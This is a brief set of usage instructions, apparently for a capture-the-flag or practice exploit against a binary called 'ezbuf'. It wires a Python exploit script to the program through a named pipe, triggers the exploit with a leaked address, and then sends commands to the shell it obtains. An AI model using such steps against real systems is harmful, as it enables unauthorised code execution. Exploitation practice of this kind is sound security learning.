Make a FIFO to use as an intermediary:

    $ mkfifo fifo

Start up Python with stdout redirected to this FIFO.

    $ python3 -i ezbuf.py | tee - fifo

Start ezbuf with stdin set to read from the FIFO.

    $ ./ezbuf < fifo

Run the exploit using the address from ezbuf.

    >>> exploit("0xdeadbeef")

Send commands to the ezbuf process which is now a shell.

    $ echo "ls -lah" > fifo
